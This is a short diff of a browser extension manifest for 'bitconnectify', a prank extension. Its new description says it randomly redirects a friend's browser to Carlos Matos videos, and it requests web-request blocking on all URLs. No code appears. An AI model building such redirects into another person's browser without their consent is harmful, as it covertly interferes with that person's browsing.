@@ -1,6 +1,6 @@
 {
 	"name": "bitconnectify",
-	"description": "My wife still doesn't believe in me!",
+	"description": "Bitconnectify your friend's browser experience with random re-directs to Carlos Matos on youtube",
 	"version": "1.0",
 	"manifest_version": 2,
 	"background": {
@@ -8,10 +8,8 @@
 	},
 	"permissions": [
 		"storage", 
-		"activeTab", 
 		"webRequest", 
 		"webRequestBlocking",
-		"tabs",
 		"<all_urls>"
 	],
 	"icons": { 
